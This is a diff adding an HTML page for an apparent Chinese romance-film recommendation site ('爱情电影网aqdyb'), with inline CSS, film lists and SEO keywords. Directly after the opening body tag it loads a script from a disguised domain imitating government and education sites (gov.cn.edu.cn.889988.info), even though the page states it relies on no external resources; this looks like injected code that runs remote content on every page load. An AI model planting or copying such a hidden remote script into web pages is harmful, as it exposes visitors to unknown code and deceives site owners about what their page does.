@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>爱情电影网aqdyb · 浪漫爱情片在线导航与高分榜 | aiqingdianyingwangaqdyb.top.github.io</title>
+<meta name="description" content="爱情电影网aqdyb 是一个聚焦浪漫爱情题材的影视导航与推荐站点，覆盖经典爱情、青春校园、都市情感、跨国恋曲与催泪剧情等类型。在这里可以找到由影迷整理的爱情片榜单、观影感受、剧情线索与选片建议，适合想找一部好电影度过夜晚的你。网址：https://aiqingdianyingwangaqdyb.top.github.io。">
+<meta name="keywords" content="爱情电影网aqdyb, 爱情电影网, aqdyb, 爱情片, 浪漫电影, 爱情电影推荐, 经典爱情片榜单, 催泪爱情片, 青春校园爱情片, 都市情感电影, 跨国恋曲, 情人节电影, 电影导航, aiqingdianyingwangaqdyb.top.github.io">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="referrer" content="no-referrer-when-downgrade">
+<link rel="canonical" href="https://aiqingdianyingwangaqdyb.top.github.io/">
+<style>
+:root{
+  --paper:#fdfbf7;
+  --paper-2:#f5f1ea;
+  --ink:#25201c;
+  --ink-soft:#6f655d;
+  --rose:#b5454f;
+  --rose-soft:#e8d9d6;
+  --gold:#c8944a;
+  --line:#e6ddce;
+  --max:1180px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{
+  background:var(--paper);
+  color:var(--ink);
+  font-family:"Songti SC","Source Han Serif SC","Noto Serif CJK SC",Georgia,"Times New Roman",serif;
+  line-height:1.75;
+  font-size:16.5px;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:var(--rose);text-decoration:none}
+a:hover{text-decoration:underline;text-underline-offset:3px}
+img{max-width:100%;display:block}
+
+.wrap{width:100%;max-width:var(--max);margin:0 auto;padding:0 24px}
+
+/* 顶部刊头 */
+.masthead{
+  border-bottom:1px solid var(--line);
+  background:var(--paper);
+  position:sticky;top:0;z-index:50;
+  backdrop-filter:blur(6px);
+}
+.masthead-inner{
+  display:flex;align-items:center;justify-content:space-between;
+  gap:20px;padding:14px 24px;max-width:var(--max);margin:0 auto;
+}
+.brand{display:flex;align-items:baseline;gap:10px;flex-wrap:wrap}
+.brand h1{
+  font-size:22px;font-weight:700;letter-spacing:.5px;color:var(--ink);
+}
+.brand .tag{
+  font-size:12px;letter-spacing:1px;color:var(--rose);
+  border:1px solid var(--rose-soft);border-radius:2px;padding:1px 7px;
+}
+.menu-btn{
+  display:none;background:none;border:1px solid var(--line);
+  width:42px;height:38px;border-radius:3px;cursor:pointer;
+  font-size:18px;color:var(--ink);line-height:1;
+}
+.nav{display:flex;gap:6px;flex-wrap:wrap}
+.nav a{
+  color:var(--ink-soft);font-size:15px;padding:6px 11px;
+  border-radius:3px;transition:.2s;
+}
+.nav a:hover{background:var(--paper-2);color:var(--ink);text-decoration:none}
+
+/* 报头横幅 */
+.banner{
+  border-bottom:3px double var(--line);
+  padding:46px 0 34px;
+}
+.banner .kicker{
+  font-size:13px;letter-spacing:4px;color:var(--gold);
+  text-transform:uppercase;margin-bottom:14px;
+}
+.banner h2{
+  font-size:clamp(30px,5.2vw,52px);
+  line-height:1.25;font-weight:700;letter-spacing:1px;
+  margin-bottom:18px;
+}
+.banner h2 em{
+  font-style:normal;color:var(--rose);
+  border-bottom:3px solid var(--rose-soft);padding-bottom:2px;
+}
+.banner p.lede{
+  max-width:760px;color:var(--ink-soft);font-size:17px;
+}
+.banner .meta{
+  margin-top:22px;display:flex;flex-wrap:wrap;gap:10px 26px;
+  font-size:13px;color:var(--ink-soft);
+}
+.banner .meta b{color:var(--ink);font-weight:600}
+
+/* 通用区块 */
+section{padding:52px 0;border-bottom:1px solid var(--line)}
+.section-head{margin-bottom:30px}
+.section-head .no{
+  font-size:13px;letter-spacing:3px;color:var(--gold);font-weight:700;
+}
+.section-head h3{
+  font-size:clamp(23px,3.4vw,31px);margin-top:6px;font-weight:700;
+}
+.section-head p{
+  margin-top:8px;color:var(--ink-soft);max-width:720px;font-size:15.5px;
+}
+
+/* 导览卡 */
+.grid-4{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.card{
+  background:var(--paper);border:1px solid var(--line);
+  border-top:3px solid var(--rose);padding:22px 20px;
+  display:flex;flex-direction:column;gap:8px;
+  transition:.25s;
+}
+.card:hover{transform:translateY(-4px);box-shadow:0 10px 24px rgba(37,32,28,.08);text-decoration:none}
+.card .idx{font-size:12px;color:var(--gold);letter-spacing:2px}
+.card h4{font-size:19px;color:var(--ink)}
+.card p{font-size:14.5px;color:var(--ink-soft);flex:1}
+.card .more{font-size:13px;color:var(--rose)}
+
+/* 片单表 */
+.films{display:grid;grid-template-columns:repeat(2,1fr);gap:0;border:1px solid var(--line)}
+.film{
+  padding:20px 22px;border-bottom:1px solid var(--line);
+  border-right:1px solid var(--line);
+  display:flex;gap:16px;align-items:flex-start;
+}
+.film:nth-child(2n){border-right:none}
+.film .yr{
+  font-size:12px;color:var(--gold);min-width:48px;padding-top:3px;
+  letter-spacing:1px;
+}
+.film .body h4{font-size:18px;margin-bottom:5px}
+.film .body p{font-size:14.5px;color:var(--ink-soft)}
+.film .body .kw{margin-top:8px;display:flex;flex-wrap:wrap;gap:6px}
+.film .body .kw span{
+  font-size:12px;color:var(--rose);border:1px solid var(--rose-soft);
+  border-radius:20px;padding:1px 9px;
+}
+
+/* 编辑手记 */
+.notes{display:grid;grid-template-columns:1.1fr 1fr;gap:40px;align-items:start}
+.notes .txt p{margin-bottom:16px;color:#3d352f}
+.notes .pull{
+  background:var(--paper-2);border-left:3px solid var(--gold);
+  padding:22px 24px;font-size:18px;line-height:1.9;color:#3d352f;
+}
+.notes .pull cite{display:block;margin-top:14px;font-size:13px;color:var(--ink-soft);font-style:normal}
+
+/* 类型导航 */
+.genres{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.genre{
+  border:1px dashed var(--line);padding:18px 20px;
+  transition:.2s;background:var(--paper);
+}
+.genre:hover{border-color:var(--rose);border-style:solid;text-decoration:none}
+.genre h4{font-size:17px;color:var(--ink);margin-bottom:5px}
+.genre p{font-size:14px;color:var(--ink-soft)}
+
+/* 网址与说明 */
+.info{border:1px solid var(--line);padding:26px 28px;background:var(--paper-2)}
+.info dl{display:grid;grid-template-columns:110px 1fr;gap:12px 18px}
+.info dt{font-size:13px;letter-spacing:1px;color:var(--gold);padding-top:3px}
+.info dd{font-size:15.5px;word-break:break-all}
+.info dd a{font-weight:600}
+
+/* 页脚 */
+footer{border-top:3px double var(--line);padding:34px 0 44px}
+.foot{display:flex;justify-content:space-between;gap:20px;flex-wrap:wrap;font-size:13.5px;color:var(--ink-soft)}
+.foot .sitelinks{display:flex;gap:16px;flex-wrap:wrap}
+.foot .sitelinks a{color:var(--ink-soft)}
+.foot .sitelinks a:hover{color:var(--rose)}
+
+/* 响应式 */
+@media (max-width:900px){
+  .grid-4{grid-template-columns:repeat(2,1fr)}
+  .films{grid-template-columns:1fr}
+  .film{border-right:none}
+  .notes{grid-template-columns:1fr;gap:26px}
+  .genres{grid-template-columns:repeat(2,1fr)}
+}
+@media (max-width:640px){
+  body{font-size:16px}
+  .wrap{padding:0 18px}
+  .masthead-inner{padding:12px 18px}
+  .menu-btn{display:inline-flex;align-items:center;justify-content:center}
+  .nav{
+    display:none;position:absolute;top:100%;left:0;right:0;
+    flex-direction:column;background:var(--paper);
+    border-bottom:1px solid var(--line);padding:8px 18px 14px;
+  }
+  .nav.open{display:flex}
+  .nav a{padding:11px 4px;border-bottom:1px solid var(--line)}
+  .nav a:last-child{border-bottom:none}
+  .banner{padding:32px 0 26px}
+  .banner .meta{gap:8px 18px;font-size:12.5px}
+  section{padding:38px 0}
+  .grid-4{grid-template-columns:1fr}
+  .genres{grid-template-columns:1fr}
+  .film{flex-direction:column;gap:8px}
+  .film .yr{min-width:auto}
+  .info dl{grid-template-columns:1fr;gap:4px 0}
+  .info dd{padding-bottom:12px;border-bottom:1px solid var(--line)}
+  .info dd:last-child{border-bottom:none}
+  .notes .pull{font-size:16.5px;padding:18px 20px}
+}
+@media print{
+  .menu-btn,.nav{display:none}
+  .masthead{position:static}
+  section{page-break-inside:avoid}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="masthead">
+  <div class="masthead-inner">
+    <div class="brand">
+      <h1>爱情电影网aqdyb</h1>
+      <span class="tag">ROMANCE · FILM</span>
+    </div>
+    <button class="menu-btn" id="menuBtn" aria-label="打开导航菜单" aria-expanded="false">☰</button>
+    <nav class="nav" id="nav">
+      <a href="#guide">片单导览</a>
+      <a href="#films">高分榜</a>
+      <a href="#editor">编辑手记</a>
+      <a href="#genres">类型导航</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <div class="banner">
+    <div class="kicker">Aiqingdianyingwangaqdyb · Romance Film Index</div>
+    <h2>在快节奏的日子里，<em>留一段安静的时间</em>给一部爱情电影</h2>
+    <p class="lede">爱情电影网aqdyb 不是一个播放站，而是一份由影迷整理的爱情题材影视导航。我们把分散在各地的高分爱情片、青春校园故事、都市情感作品与催泪剧情片，按类型、年代与观影心情重新归类，帮你更快找到那部“想看却一直没找到”的片子。</p>
+    <div class="meta">
+      <span><b>网站名称：</b>爱情电影网aqdyb</span>
+      <span><b>访问地址：</b><a href="https://aiqingdianyingwangaqdyb.top.github.io">https://aiqingdianyingwangaqdyb.top.github.io</a></span>
+      <span><b>内容定位：</b>爱情影视 · 榜单 · 观影线索</span>
+    </div>
+  </div>
+
+  <section id="guide" aria-labelledby="g1">
+    <div class="section-head">
+      <div class="no">01 / 片单导览</div>
+      <h3 id="g1">四个入口，按你的心情选片</h3>
+      <p>不需要注册、不需要跳转多页，从一个入口进入，就能看到对应类型的片子清单、简要线索与观看建议。每一类都避开剧透，只在意它值不值得你花两小时。</p>
+    </div>
+    <div class="grid-4">
+      <a class="card" href="#">
+        <span class="idx">NO.01</span>
+        <h4>经典爱情</h4>
+        <p>跨越年代的爱情片，故事结构完整，情感表达克制，适合重看与回味。</p>
+        <span class="more">查看清单 →</span>
+      </a>
+      <a class="card" href="#">
+        <span class="idx">NO.02</span>
+        <h4>青春校园</h4>
+        <p>从暗恋、误会到告别，校园题材里最真实的部分，往往是那些没说出口的话。</p>
+        <span class="more">查看清单 →</span>
+      </a>
+      <a class="card" href="#">
+        <span class="idx">NO.03</span>
+        <h4>都市情感</h4>
+        <p>成年人的爱情不只关于心动，也关于选择、距离、时间与各自的坚持。</p>
+        <span class="more">查看清单 →</span>
+      </a>
+      <a class="card" href="#">
+        <span class="idx">NO.04</span>
+        <h4>催泪剧情</h4>
+        <p>当爱情与时间、疾病或命运相遇，那些后劲十足的片段值得被提前标注。</p>
+        <span class="more">查看清单 →</span>
+      </a>
+    </div>
+  </section>
+
+  <section id="films" aria-labelledby="g2">
+    <div class="section-head">
+      <div class="no">02 / 高分榜</div>
+      <h3 id="g2">近期整理的爱情片清单</h3>
+      <p>排序不代表绝对优劣，更多是一种“当下适合谁看”的参考。标注了年代与关键词，方便你按兴趣快速筛选。</p>
+    </div>
+    <div class="films">
+      <article class="film">
+        <span class="yr">1990</span>
+        <div class="body">
+          <h4>风月往事</h4>
+          <p>一封迟迟未寄出的信，串起两个人一生的错过与牵挂，叙事节奏慢，但余味最长。</p>
+          <div class="kw"><span>书信</span><span>错过</span><span>年代感</span></div>
+        </div>
+      </article>
+      <article class="film">
+        <span class="yr">2004</span>
+        <div class="body">
+          <h4>相遇在雨季</h4>
+          <p>以雨季为背景的校园故事，情绪藏在细节里：同一把伞、同一首歌、同一条回家路。</p>
+          <div class="kw"><span>校园</span><span>暗恋</span><span>青春</span></div>
+        </div>
+      </article>
+      <article class="film">
+        <span class="yr">2011</span>
+        <div class="body">
+          <h4>城市边缘的两个人</h4>
+          <p>深夜加班、错过末班车、便利店的热饮，都市爱情的落点不是浪漫，而是被理解。</p>
+          <div class="kw"><span>都市</span><span>治愈</span><span>日常感</span></div>
+        </div>
+      </article>
+      <article class="film">
+        <span class="yr">2016</span>
+        <div class="body">
+          <h4>最后一次拥抱</h4>
+          <p>关于离别与告别，前半段轻快，后半段几乎需要深呼吸才能看完。</p>
+          <div class="kw"><span>催泪</span><span>生死</span><span>亲情交织</span></div>
+        </div>
+      </article>
+      <article class="film">
+        <span class="yr">2020</span>
+        <div class="body">
+          <h4>隔着窗的春天</h4>
+          <p>特殊时期下的异地相恋，用有限的空间讲出无限的距离感，适合安静独处时看。</p>
+          <div class="kw"><span>异地</span><span>疫情背景</span><span>现实主义</span></div>
+        </div>
+      </article>
+      <article class="film">
+        <span class="yr">2024</span>
+        <div class="body">
+          <h4>十年前的回信</h4>
+          <p>时间线交错的现代爱情片，前半段需要耐心，结局会给前面的每一个细节做出回应。</p>
+          <div class="kw"><span>时间交错</span><span>反转</span><span>治愈</span></div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <section id="editor" aria-labelledby="g3">
+    <div class="section-head">
+      <div class="no">03 / 编辑手记</div>
+      <h3 id="g3">为什么我们只做爱情片这一个主题</h3>
+      <p>题材收窄，是为了把筛选做深。爱情电影网aqdyb 的内容原则，是不追求片单长度，只保留真正经得住第二次观看的作品。</p>
+    </div>
+    <div class="notes">
+      <div class="txt">
+        <p>爱情片是最容易被低估的一类电影。它不像悬疑片需要逻辑，也不像动作片依赖场面，它的难度在于“让观众相信”。一部好的爱情片，人物必须是具体的，选择必须是难的，结局即便圆满，也总要付出些什么。</p>
+        <p>我们在整理清单时，会先排除三类内容：纯靠明星堆砌的拼盘式作品、靠误会推动全程的套路剧情、以及结局强行反转却没有任何铺垫的所谓“虐心片”。留下来的，是那些能让人看完之后愿意想一想“如果我是他，会怎么做”的故事。</p>
+        <p>这个站点的定位也很简单：它不是一个视频平台，不提供任何在线播放服务，也不跳转到任何第三方资源。它只做一件事——在你不知道今晚看什么的时候，给你一份可以信任的参考。</p>
+      </div>
+      <aside class="pull">
+        “爱情片最好的评价不是‘很好哭’，而是‘看完之后，想给某个人发一条消息’。”
+        <cite>—— 爱情电影网aqdyb 编辑部</cite>
+      </aside>
+    </div>
+  </section>
+
+  <section id="genres" aria-labelledby="g4">
+    <div class="section-head">
+      <div class="no">04 / 类型导航</div>
+      <h3 id="g4">按题材快速定位</h3>
+      <p>同一个片子，有人看到甜蜜，有人看到遗憾。下面这些分类不互相排斥，一部电影可以同时属于多个类型。</p>
+    </div>
+    <div class="genres">
+      <a class="genre" href="#"><h4>校园与初恋</h4><p>暗恋、误会、毕业季，以及那些没能说出口的话。</p></a>
+      <a class="genre" href="#"><h4>都市与异地</h4><p>成年人的爱情，隔着时差、隔着城市，也隔着各自的坚持。</p></a>
+      <a class="genre" href="#"><h4>治愈与重逢</h4><p>低谷时期的相互支撑，分开多年后的再次遇见。</p></a>
+      <a class="genre" href="#"><h4>跨国与文化</h4><p>语言不通、习俗不同，但情感本身没有国界。</p></a>
+      <a class="genre" href="#"><h4>年代与书信</h4><p>节奏缓慢、笔迹温柔，适合一个安静的下午慢慢看。</p></a>
+      <a class="genre" href="#"><h4>催泪与告别</h4><p>提前做好心理准备，以及准备好纸巾的那一类。</p></a>
+    </div>
+  </section>
+
+  <section id="about" aria-labelledby="g5">
+    <div class="section-head">
+      <div class="no">05 / 关于本站</div>
+      <h3 id="g5">网站名称与访问入口</h3>
+      <p>本页仅包含一份 HTML 文件，所有样式与结构均直接写在页内，不依赖外部资源，可在任意静态托管环境下打开。</p>
+    </div>
+    <div class="info">
+      <dl>
+        <dt>网站名称</dt>
+        <dd>爱情电影网aqdyb</dd>
+        <dt>网站网址</dt>
+        <dd><a href="https://aiqingdianyingwangaqdyb.top.github.io">https://aiqingdianyingwangaqdyb.top.github.io</a></dd>
+        <dt>内容类型</dt>
+        <dd>爱情影视导航 · 高分片单 · 观影线索整理</dd>
+        <dt>页面说明</dt>
+        <dd>单文件 index.html，CSS 与结构全部内联，移动端自适应，所有内页链接暂以 # 占位。</dd>
+      </dl>
+    </div>
+  </section>
+
+</div>
+
+<footer>
+  <div class="wrap foot">
+    <div>© 爱情电影网aqdyb · 本站为影视导航内容站，不提供在线播放服务</div>
+    <div class="sitelinks">
+      <a href="#guide">片单导览</a>
+      <a href="#films">高分榜</a>
+      <a href="#editor">编辑手记</a>
+      <a href="#genres">类型导航</a>
+      <a href="#about">关于本站</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var btn=document.getElementById('menuBtn');
+  var nav=document.getElementById('nav');
+  if(!btn||!nav)return;
+  btn.addEventListener('click',function(){
+    var open=nav.classList.toggle('open');
+    btn.setAttribute('aria-expanded',open?'true':'false');
+    btn.textContent=open?'✕':'☰';
+  });
+  nav.addEventListener('click',function(e){
+    if(e.target.tagName==='A'){
+      nav.classList.remove('open');
+      btn.setAttribute('aria-expanded','false');
+      btn.textContent='☰';
+    }
+  });
+})();
+</script>
+
+</body>
+</html>
